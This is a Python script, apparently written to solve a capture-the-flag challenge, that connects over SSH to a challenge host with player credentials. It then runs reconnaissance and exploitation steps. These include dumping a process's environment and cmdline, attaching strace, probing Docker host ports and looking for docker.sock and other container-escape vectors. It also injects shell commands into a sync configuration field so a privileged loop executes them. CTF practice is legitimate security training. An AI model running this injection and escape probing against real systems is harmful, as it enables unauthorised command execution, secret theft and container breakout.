#!/usr/bin/env python3
import paramiko
import time

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=10)
    return (stdout.read() + stderr.read()).decode()

print("[*] Deep investigation of sync mechanism...")

# 1. Find ALL sync-related files
print("\n[1] Sync-related files:")
print(cmd("find /opt/mc -type f 2>/dev/null | xargs ls -la"))

# 2. Check if sync-loop.sh is readable
print("\n[2] Trying to read sync-loop.sh:")
print(cmd("cat /opt/mc/scripts/sync-loop.sh 2>/dev/null || echo 'Not readable'"))
print(cmd("strings /opt/mc/scripts/sync-loop.sh 2>/dev/null | head -20"))

# 3. Check strace capability
print("\n[3] Can we strace the sync process?")
print(cmd("strace -p 16 2>&1 | head -10"))

# 4. Check /proc/16 for clues
print("\n[4] Process information:")
print(cmd("ls -la /proc/16/ 2>/dev/null"))
print(cmd("cat /proc/16/cmdline 2>/dev/null; echo"))
print(cmd("cat /proc/16/environ 2>/dev/null | tr '\\0' '\\n'"))

# 5. Monitor file creation in real-time
print("\n[5] Setting trigger and monitoring filesystem...")
cmd('echo "talldwarf-sync-command=touch /tmp/sync-test-$(date +%s)" > /opt/mc/config/sync-request.conf')
time.sleep(3)
before = cmd("find /tmp /opt/mc /dev/shm -type f 2>/dev/null | sort")
time.sleep(10)
after = cmd("find /tmp /opt/mc /dev/shm -type f 2>/dev/null | sort")

print("Files BEFORE:", before[:500])
print("Files AFTER:", after[:500])

# 6. Check if there's a web interface on the Docker host
print("\n[6] Checking Docker host web services:")
for port in [80, 8080, 5000]:
    result = cmd(f"python3 -c \"import urllib.request; print(urllib.request.urlopen('http://172.27.0.1:{port}/', timeout=2).read()[:200])\" 2>/dev/null")
    if result.strip():
        print(f"Port {port}: {result}")

# 7. Try to execute a command that MUST produce visible output
print("\n[7] Testing command execution proof:")
cmd('echo "talldwarf-sync-command=echo SYNC_WORKS > /opt/mc/config/test-output.txt" > /opt/mc/config/sync-request.conf')
time.sleep(12)
print("Test output:", cmd("cat /opt/mc/config/test-output.txt 2>/dev/null"))

# 8. Check network connections from sync process
print("\n[8] Network connections:")
print(cmd("netstat -tunap 2>/dev/null | grep -E '(16|sync)'"))

# 9. Look for Docker socket or escape vectors
print("\n[9] Docker escape vectors:")
print(cmd("ls -la /var/run/docker.sock 2>/dev/null"))
print(cmd("ls -la /.dockerenv 2>/dev/null"))
print(cmd("cat /proc/1/cgroup 2>/dev/null | head -5"))

ssh.close()
